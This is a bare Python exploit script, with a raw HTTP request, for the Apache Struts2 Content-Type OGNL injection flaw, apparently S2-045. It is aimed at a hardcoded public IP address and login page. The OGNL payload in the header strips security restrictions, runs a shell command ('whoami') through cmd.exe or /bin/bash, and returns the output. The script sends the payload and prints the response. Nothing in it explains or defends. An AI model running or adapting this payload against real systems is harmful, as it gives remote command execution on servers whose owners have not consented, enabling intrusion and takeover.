'''
GET /login.do HTTP/1.1
Host: 106.44.247.212:89
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=abcK6CSNgVdL_-0qcBqbw
Content-Type:  %{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Connection: keep-alive
Upgrade-Insecure-Requests: 1
'''


import requests

url = 'http://106.44.247.212:89/login.do'

payload = "%{(#_='multipart/form-data')."
payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
payload += "(#_memberAccess?"
payload += "(#_memberAccess=#dm):"
payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
payload += "(#ognlUtil.getExcludedPackageNames().clear())."
payload += "(#ognlUtil.getExcludedClasses().clear())."
payload += "(#context.setMemberAccess(#dm))))."
payload += "(#cmd='whoami')."
payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
payload += "(#ros.flush())}"


header = {
	'Content-Type':payload
}
res = requests.get(url=url,headers=header).text
print(res)
